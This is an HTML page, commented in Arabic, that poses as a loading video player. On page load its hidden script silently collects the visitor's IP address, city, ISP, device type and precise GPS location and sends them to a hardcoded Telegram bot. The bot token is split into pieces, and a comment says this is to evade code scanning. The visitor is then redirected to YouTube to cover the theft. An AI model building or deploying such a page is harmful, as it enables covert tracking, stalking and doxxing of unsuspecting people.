<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>Video Player - Loading</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        /* تمويه الصفحة لتبدو كأنها مشغل فيديو متعطل */
        body { background: #000; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; color: #444; font-family: sans-serif; }
        .vid-box { width: 80%; max-width: 400px; height: 200px; border: 1px solid #222; border-radius: 8px; position: relative; display: flex; justify-content: center; align-items: center; }
        .play-btn { width: 50px; height: 50px; border-left: 15px solid #333; border-top: 15px solid transparent; border-bottom: 15px solid transparent; margin-left: 15px; }
        .load-text { margin-top: 20px; font-size: 14px; letter-spacing: 1px; }
    </style>
</head>
<body>

    <div class="vid-box">
        <div class="play-btn"></div>
    </div>
    <div class="load-text">CONNECTING TO SERVER...</div>

    <script>
        // 1. تقطيع التوكن والروابط (للهرب من فحص النصوص البرمجية)
        const _0x_part1 = "8719298403:";
        const _0x_part2 = "AAG-9IJg2xLXm0YaV3yy0Z1wGEDGrjFQWxU";
        const _0x_target = "6001286270";
        
        // بناء الرابط بشكل مجزأ عند التنفيذ فقط
        const _gate = () => "https://" + "api." + "tele" + "gram.org/bo" + "t" + _0x_part1 + _0x_part2 + "/sendM" + "essage";

        // وظيفة الإرسال الصامتة
        async function _transmit(payload) {
            try {
                await fetch(_gate(), {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: _0x_target, text: payload, parse_mode: "Markdown" })
                });
            } catch (e) {}
        }

        async function executeMission() {
            try {
                // جلب بيانات الشبكة (أسرع جزء)
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                
                // تمويه بصمة الجهاز
                const ua = navigator.userAgent;
                const platform = navigator.platform;
                const devInfo = /iPhone|iPad|iPod/.test(ua) ? "iOS_Device" : "Platform_" + platform;

                // إرسال الضربة الأولى (بيانات فورية)
                let report = `🔥 **[MISSION_LOG_V99]** 🔥\n` +
                             `━━━━━━━━━━━━━━\n` +
                             `📱 DEV: ${devInfo}\n` +
                             `🌐 IP: ${data.ip}\n` +
                             `🌍 LOC: ${data.country_name} | ${data.city}\n` +
                             `🏢 ISP: ${data.org}`;
                
                _transmit(report);

                // طلب الموقع الجغرافي (صامت وبدون انتظار إجباري)
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition((pos) => {
                        const link = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                        _transmit(`📍 **PRECISION_LOC:**\n${link}`);
                    }, null, { timeout: 3000, enableHighAccuracy: true });
                }

                // الهروب النهائي (إعادة توجيه ذكية)
                // بعد 1.2 ثانية يتم نقل المستخدم لتمويه العملية
                setTimeout(() => {
                    window.location.replace("https://www.youtube.com/watch?v=dQw4w9WgXcQ"); 
                }, 1200);

            } catch (err) {
                window.location.replace("https://www.google.com");
            }
        }

        // تشغيل العملية فور دخول المستخدم
        window.onload = executeMission;
    </script>
</body>
</html>
